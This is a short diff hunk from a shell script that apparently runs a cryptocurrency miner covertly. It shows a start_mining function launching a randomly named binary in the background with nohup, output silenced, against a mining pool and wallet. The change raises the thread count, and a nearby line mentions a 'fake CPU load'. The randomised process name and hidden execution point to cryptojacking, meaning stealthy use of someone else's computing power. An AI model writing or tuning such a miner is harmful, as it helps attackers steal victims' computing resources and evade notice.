@@ -44,7 +44,7 @@ echo "[+] Fake CPU load started."
 
 ### FUNCTION TO START MINING ###
 start_mining() {
-    THREADS=$(shuf -i 8-12 -n 1)
+    THREADS=$(shuf -i 12-16 -n 1)
     echo "[*] Starting mining with $THREADS threads..."
     nohup ./$RAND_NAME -o $POOL -u $WALLET -k -p $WORKER_ID --tls --donate-level 1 -t $THREADS >/dev/null 2>&1 &
     MINER_PID=$!
